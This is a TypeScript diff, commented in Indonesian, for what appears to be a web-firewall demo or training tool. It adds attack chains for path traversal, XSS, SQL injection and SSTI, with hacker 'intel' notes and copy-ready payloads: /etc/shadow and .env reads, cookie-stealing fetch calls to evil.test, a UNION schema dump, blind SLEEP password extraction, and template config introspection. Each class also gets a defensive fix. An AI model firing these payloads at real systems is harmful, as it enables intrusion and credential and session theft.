@@ -16,6 +16,17 @@ export interface HackerMethod {
         | { kind: "rce"; cmd: string };
 }
 
+export interface ChainProbe {
+    /** Template path dengan placeholder {n}, mis. "/?id=1%20ORDER%20BY%20{n}". */
+    template: string;
+    from: number;
+    to: number;
+    /** Substring penanda respons normal (nilai n valid). */
+    successExpect: string;
+    /** Ringkasan siap pakai bila jumlah pasti ketemu ({n} = jumlah kolom). */
+    foundSummary?: string;
+}
+
 export interface ChainStep {
     label: string;
     desc: string;
@@ -23,6 +34,24 @@ export interface ChainStep {
     method?: string;
     /** Substring yang dicari di body sebagai tanda langkah berhasil. */
     expect: string;
+    /** Briefing hacker: arti hasil + apa yang diincar berikutnya. */
+    intel?: string;
+    /** Bila ada: sapu N nilai otomatis untuk menyimpulkan angka pasti. */
+    probe?: ChainProbe;
+    /** Bila ada: respons dianggap membuktikan delay bila ≥ N ms (blind/time-based). */
+    timingMs?: number;
+    /**
+     * Bila ada: uji token mentah vs ter-encode (XSS) — mis. ["<img", "<svg"].
+     * Dilaporkan per token: mentah ✅ / ter-encode ⚠️ / hilang ❌.
+     */
+    reflect?: string[];
+    /**
+     * Bila ada: bukti evaluasi template (SSTI) — `{ raw: "{{7*7}}", value: "49" }`.
+     * Terevaluasi = nilai ada tapi sintaks mentah hilang dari body.
+     */
+    evalCheck?: { raw: string; value: string };
+    /** Payload presisi lanjutan yang siap disalin bila langkah ini berhasil. */
+    next?: string;
 }
 
 export interface VulnInfo {
@@ -79,9 +108,33 @@ export const VULN_INFO: Record<string, VulnInfo> = {
         gap: "Parameter path tidak disanitasi — penyerang keluar dari webroot dan membaca berkas sistem apa pun yang bisa dibaca user web.",
         fix: "Pasak: instant-block path_traversal_public + rules path_traversal/null_byte (403). Di aplikasi: jangan sertakan input user ke path file; pakai allowlist + basename().",
         chain: [
-            { label: "Baca shadow (uji privilege)", desc: "Bila terbaca = user webchoice root-level, kritis maksimal.", path: "/?file=../../../../etc/shadow", method: "GET", expect: "root:" },
-            { label: "Incar konfigurasi", desc: "database.php berisi kredensial DB aplikasi.", path: "/?file=../../../../config/database.php", method: "GET", expect: "DB_" },
-            { label: "Wrapper filter", desc: "php://filter membaca source tanpa eksekusi.", path: "/?file=php://filter/convert.base64-encode/resource=index.php", method: "GET", expect: "PD9waHA" },
+            {
+                label: "Baca shadow (uji privilege)",
+                desc: "Bila terbaca = user web setara root, kritis maksimal.",
+                path: "/?file=../../../../etc/shadow",
+                method: "GET",
+                expect: "root:",
+                intel: "Target: baris '$6$...' = hash sha512crypt siap di-crack (hashcat -m 1800). Bila shadow tertolak tapi passwd terbaca = user web biasa, lanjut incar file aplikasi.",
+                next: "/?file=../../../../etc/shadow",
+            },
+            {
+                label: "Incar konfigurasi",
+                desc: "database.php berisi kredensial DB aplikasi.",
+                path: "/?file=../../../../config/database.php",
+                method: "GET",
+                expect: "DB_",
+                intel: "Incar: DB_HOST/DB_USERNAME/DB_PASSWORD + kredensial mail/queue. Satu password valid = akses database penuh dari luar.",
+                next: "/?file=../../../../.env",
+            },
+            {
+                label: "Wrapper filter",
+                desc: "php://filter membaca source tanpa eksekusi — cuplikan base64 di bawah bisa di-decode.",
+                path: "/?file=php://filter/convert.base64-encode/resource=index.php",
+                method: "GET",
+                expect: "PD9waHA",
+                intel: "'PD9waHA' = base64 dari '<?php' — artinya source terbaca. Decode cuplikan (echo ... | base64 -d) untuk membaca kode: cari query mentah, kunci, dan path include.",
+                next: "/?file=php://filter/convert.base64-encode/resource=config/database.php",
+            },
         ],
         methods: [
             { title: "File disclosure", desc: "/etc/passwd → enumerasi user OS; lanjut ke config/database.php, .env.", exec: { kind: "vector", path: "/../../../../etc/passwd", method: "GET" } },
@@ -96,9 +149,36 @@ export const VULN_INFO: Record<string, VulnInfo> = {
         gap: "Input query dicerminkan ke HTML tanpa encoding — browser korban mengeksekusi JavaScript penyerang dalam konteks domain aplikasi.",
         fix: "Pasak: rules xss mencatat & menolak payload <script> (403 bila block_suspicious_requests aktif). Di aplikasi: escape output dengan {{ }}, tambah header Content-Security-Policy.",
         chain: [
-            { label: "Bypass event handler", desc: "onerror mengeksekusi tanpa tag script.", path: "/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", method: "GET", expect: "onerror" },
-            { label: "Vektor SVG", desc: "onload pada svg lolos filter naif.", path: "/?q=%3Csvg%20onload%3Dalert(1)%3E", method: "GET", expect: "onload" },
-            { label: "Curi cookie (PoC)", desc: "Payload pencurian sesi — bukti dampak maksimal.", path: "/?q=%3Cscript%3Edocument.cookie%3C%2Fscript%3E", method: "GET", expect: "document.cookie" },
+            {
+                label: "Bypass event handler",
+                desc: "onerror mengeksekusi tanpa tag script — dicek mentah vs ter-encode.",
+                path: "/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
+                method: "GET",
+                expect: "onerror",
+                reflect: ["<img", "onerror=", "alert(1)"],
+                intel: "Yang dicari hacker: payload kembali MENTAH (tak di-escape). Satu token mentah = eksekusi di browser korban = curi sesi.",
+                next: "/?q=%3Cimg%20src%3Dx%20onerror%3Dfetch(%27https%3A%2F%2Fevil.test%2F%3Fc%3D%27%2Bdocument.cookie)%3E",
+            },
+            {
+                label: "Vektor SVG",
+                desc: "onload pada svg lolos filter naif.",
+                path: "/?q=%3Csvg%20onload%3Dalert(1)%3E",
+                method: "GET",
+                expect: "onload",
+                reflect: ["<svg", "onload=", "alert(1)"],
+                intel: "Filter yang hanya memblokir '<script' lolos oleh svg/math/body + event handler. Varian ini menembus WAF berbasis kata kunci.",
+                next: "/?q=%3Csvg%20onload%3Dfetch(%27https%3A%2F%2Fevil.test%2F%3Fk%3D%27%2Bbtoa(document.cookie))%3E",
+            },
+            {
+                label: "Curi cookie (PoC)",
+                desc: "Payload pencurian sesi — bukti dampak maksimal.",
+                path: "/?q=%3Cscript%3Edocument.cookie%3C%2Fscript%3E",
+                method: "GET",
+                expect: "document.cookie",
+                reflect: ["<script>", "document.cookie"],
+                intel: "PoC final: script tereksekusi dalam origin aplikasi = baca cookie HttpOnly? tidak — tapi sesi non-HttpOnly, localStorage, dan aksi atas nama korban bisa.",
+                next: "/?q=%3Cscript%3Efetch(%27https%3A%2F%2Fevil.test%2F%3Fc%3D%27%2Bdocument.cookie)%3C%2Fscript%3E",
+            },
         ],
         methods: [
             { title: "Session hijacking", desc: "fetch(document.cookie) dikirim ke server penyerang → bajak sesi login.", exec: { kind: "vector", path: "/?q=%3Cscript%3Efetch(%27https%3A%2F%2Fevil.test%2F%3Fc%3D%27%2Bdocument.cookie)%3C%2Fscript%3E", method: "GET" } },
@@ -113,9 +193,40 @@ export const VULN_INFO: Record<string, VulnInfo> = {
         gap: "Input digabung mentah ke query SQL — penyerang mengubah logika WHERE, membaca tabel apa pun, bahkan menulis file via INTO OUTFILE.",
         fix: "Pasak: rules sql_injection (critical) + auto-block setelah ambang. Di aplikasi: selalu prepared statement / Eloquent binding — jangan gabung string ke SQL.",
         chain: [
-            { label: "Petakan kolom", desc: "ORDER BY menebak jumlah kolom untuk UNION presisi.", path: "/?id=1%20ORDER%20BY%205", method: "GET", expect: "Laravel" },
-            { label: "Dump skema", desc: "Baca information_schema untuk daftar tabel.", path: "/?id=-1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables", method: "GET", expect: "users" },
-            { label: "Konfirmasi blind", desc: "SLEEP(5) membuktikan injeksi buta bila output disaring.", path: "/?id=1%20AND%20SLEEP(5)", method: "GET", expect: "Laravel" },
+            {
+                label: "Petakan kolom",
+                desc: "ORDER BY menyapu 1–8 otomatis untuk menemukan jumlah kolom pasti sebelum UNION.",
+                path: "/?id=1%20ORDER%20BY%205",
+                method: "GET",
+                expect: "Laravel",
+                intel: "Hacker butuh jumlah kolom TEPAT: nilai valid = halaman normal (200 + konten), nilai pertama yang error = jumlah+1. Tanpa angka ini, UNION SELECT selalu gagal total — tebak manual satu per satu buang waktu dan berisik di log.",
+                probe: {
+                    template: "/?id=1%20ORDER%20BY%20{n}",
+                    from: 1,
+                    to: 8,
+                    successExpect: "Laravel",
+                    foundSummary: "🎯 {n} kolom terkonfirmasi. Payload UNION presisi: /?id=-1 UNION SELECT {nulls}-- -  (ganti tiap NULL satu per satu dengan table_name, column_name, dst).",
+                },
+            },
+            {
+                label: "Dump skema",
+                desc: "Baca information_schema untuk daftar tabel.",
+                path: "/?id=-1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables",
+                method: "GET",
+                expect: "users",
+                intel: "Incar: nama tabel (users, password_resets, sessions), lalu kolomnya via information_schema.columns. Satu nama tabel valid = separuh jalan ke dump kredensial.",
+                next: "/?id=-1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'",
+            },
+            {
+                label: "Konfirmasi blind",
+                desc: "SLEEP(5) membuktikan injeksi buta bila output disaring — dinilai dari WAKTU respons, bukan isi body.",
+                path: "/?id=1%20AND%20SLEEP(5)",
+                method: "GET",
+                expect: "Laravel",
+                timingMs: 4000,
+                intel: "Bila halaman memfilter output (tak ada pesan error), hacker beralih ke blind: respons ≥4 detik = query SLEEP dieksekusi = injeksi TERBUKTI. Selanjutnya ekstrak data per bit (SUBSTRING + SLEEP kondisional).",
+                next: "/?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)",
+            },
         ],
         methods: [
             { title: "Auth bypass", desc: "admin' OR '1'='1 masuk tanpa password.", exec: { kind: "vector", path: "/?user=admin%27%20OR%20%271%27%3D%271", method: "GET" } },
@@ -130,9 +241,35 @@ export const VULN_INFO: Record<string, VulnInfo> = {
         gap: "Input dievaluasi template engine server — canary {{7*7}}→49 membuktikan eksekusi; objek internal (config, env) bisa diakses lalu RCE.",
         fix: "Pasak: signature ssti instant-block canary {{7*7}} (403). Di aplikasi: jangan render input user sebagai template; bila perlu, pakai sandbox + denylist sintaks.",
         chain: [
-            { label: "Konfirmasi aritmetika", desc: "{{7-7}} harus menghasilkan 0 bila template mengevaluasi.", path: "/?q=%7B%7B7-7%7D%7D", method: "GET", expect: "49" },
-            { label: "Introspeksi objek", desc: "{{self}} membocorkan objek template internal.", path: "/?q=%7B%7Bself%7D%7D", method: "GET", expect: "self" },
-            { label: "Varian sintaks", desc: "${7*7} menguji engine gaya Spring/Freemarker.", path: "/?q=%24%7B7*7%7D", method: "GET", expect: "49" },
+            {
+                label: "Konfirmasi aritmetika",
+                desc: "{{7-7}} harus menghasilkan 0 bila template mengevaluasi — dicek nilai vs sintaks mentah.",
+                path: "/?q=%7B%7B7-7%7D%7D",
+                method: "GET",
+                expect: "0",
+                evalCheck: { raw: "{{7-7}}", value: "0" },
+                intel: "Aturan baca: nilai '0' ADA + sintaks mentah HILANG = template mengevaluasi = SSTI positif. Nilai ada tapi sintaks ikut tercermin = hanya gema, belum bukti.",
+                next: "/?q=%7B%7Bself%7D%7D",
+            },
+            {
+                label: "Introspeksi objek",
+                desc: "{{self}} membocorkan objek template internal.",
+                path: "/?q=%7B%7Bself%7D%7D",
+                method: "GET",
+                expect: "self",
+                intel: "Incar: nama class + atribut (config, environ, request). Satu objek terbuka = peta jalan ke secrets dan RCE.",
+                next: "/?q=%7B%7Bconfig.items()%7D%7D",
+            },
+            {
+                label: "Varian sintaks",
+                desc: "${7*7} menguji engine gaya Spring/Freemarker — harus 49 bila cocok.",
+                path: "/?q=%24%7B7*7%7D",
+                method: "GET",
+                expect: "49",
+                evalCheck: { raw: "${7*7}", value: "49" },
+                intel: "Tiap engine beda sintaks: Twig {{ }}, Smarty { }, Spring ${ }. Satu varian yang terevaluasi = identitas engine ketahuan.",
+                next: "/?q=%24%7B7*7%7D",
+            },
         ],
         methods: [
             { title: "Canary confirm", desc: "{{7*7}} → 49 di body = template mengevaluasi input.", exec: { kind: "vector", path: "/?q=%7B%7B7*7%7D%7D", method: "GET" } },
